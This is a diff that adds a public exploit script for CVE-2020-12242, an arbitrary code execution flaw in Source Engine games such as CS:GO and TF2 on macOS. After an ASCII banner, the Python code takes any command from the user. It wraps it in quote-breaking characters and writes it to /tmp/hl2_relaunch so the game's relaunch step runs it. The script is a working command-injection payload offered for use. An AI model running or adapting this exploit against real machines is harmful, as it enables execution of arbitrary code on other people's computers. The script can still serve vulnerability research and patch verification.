@@ -1,0 +1,32 @@
+# Exploit Title: Source Engine CS:GO BuildID: 4937372 - Arbitrary Code Execution
+# Date: 2020-04-27
+# Exploit Author: 0xEmma/BugByte/SebastianPC
+# Vendor Homepage: https://www.valvesoftware.com/en/
+# Version: Source Engine, Tested on CS:GO BuildID: 4937372 TF2 BuildID: 4871679 Garry's Mod BuildID: 4803834 Half Life 2 BuildID: 4233302
+# Tested on: MacOS 15.3
+# CVE : CVE-2020-12242
+
+import os, random, sys
+banner = """
+:'######:::'#######::'##::::'##::'######:::'#######::'##:::'##::::'##:::'########:
+'##... ##:'##.... ##: ##:::: ##:'##... ##:'##.... ##: ##::'##:::'####:::... ##..::
+ ##:::..:: ##'### ##: ##:::: ##: ##:::..::..::::: ##: ##:'##::::.. ##:::::: ##::::
+. ######:: ## ### ##: ##:::: ##: ##::::::::'#######:: #####::::::: ##:::::: ##::::
+:..... ##: ## #####:: ##:::: ##: ##::::::::...... ##: ##. ##:::::: ##:::::: ##::::
+'##::: ##: ##.....::: ##:::: ##: ##::: ##:'##:::: ##: ##:. ##::::: ##:::::: ##::::
+. ######::. #######::. #######::. ######::. #######:: ##::. ##::'######:::: ##::::
+:......::::.......::::.......::::......::::.......:::..::::..:::......:::::..:::::
+"""
+print(banner)
+
+
+if os.name == "posix":
+    command = str(input("Code to run? "))
+    payload = '"; ' + command + '; echo "'
+    f = open("/tmp/hl2_relaunch", "w")
+
+    f.write(payload)
+    f.close()
+
+if os.name == "nt":
+    print("Windows based OS's not supported, see CVE-2020-12242")
